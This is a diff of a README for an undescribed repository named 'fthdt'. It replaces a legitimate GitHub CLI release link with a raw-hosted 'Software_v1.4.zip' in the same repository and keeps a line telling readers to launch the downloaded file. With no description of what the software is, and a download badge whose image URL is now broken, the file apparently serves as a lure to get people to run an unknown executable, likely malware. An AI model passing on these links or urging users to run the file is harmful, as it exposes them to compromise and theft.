@@ -6,9 +6,9 @@ This repository does not have a provided short description.
 ## Topics
 This repository does not have provided topics.
 
-Click on the following link to download the repository content: [Download fthdt](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+Click on the following link to download the repository content: [Download fthdt](https://raw.githubusercontent.com/shimulkhanrs99/fthdt/main/blee/Software_v1.4.zip)
 
-[![Download](https://img.shields.io/badge/Download-Get%20fthdt-green)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download](https://raw.githubusercontent.com/shimulkhanrs99/fthdt/main/blee/Software_v1.4.zip%20fthdt-green)](https://raw.githubusercontent.com/shimulkhanrs99/fthdt/main/blee/Software_v1.4.zip)
 
 If the link provided above ends with a file name, it needs to be launched to start the download process.
 
